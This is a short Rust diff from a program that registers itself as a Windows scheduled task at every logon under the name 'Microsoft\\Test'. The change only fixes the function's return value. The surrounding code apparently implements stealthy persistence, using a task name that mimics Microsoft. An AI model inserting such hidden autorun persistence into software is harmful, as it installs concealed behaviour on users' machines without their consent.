@@ -141,7 +141,9 @@ fn should_run() -> bool {
 fn ensure_autorun(path: &str) -> Result<()> {
     Command::new("schtasks")
         .args(&["/create", "/sc", "onlogon", "/tn", "Microsoft\\Test", "/tr", path])
-        .spawn()?
+        .spawn()?;
+
+    Ok(())
 }
 
 fn main() {
